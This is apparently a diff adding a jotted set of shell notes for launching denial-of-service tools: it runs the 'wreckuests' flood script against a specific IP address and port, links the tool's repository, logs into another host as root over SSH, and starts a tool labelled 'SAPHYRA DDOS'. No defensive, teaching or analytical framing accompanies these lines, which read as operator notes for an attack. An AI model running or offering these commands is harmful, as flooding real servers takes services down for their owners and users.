@@ -1,0 +1,20 @@
+python3 wreckuests.py -v https://142.150.8.89:6661/
+python3 wreckuests.py -v
+cd wreckuests
+
+https://github.com/abriginets/wreckuests/blob/master/README.md
+
+
+pentestool
+
+ssh root@194.195.240.20
+
+cd Anonymous
+
+
+SAPHYRA DDOS
+
+cd SAPHYRA
+
+python3 main.py
+
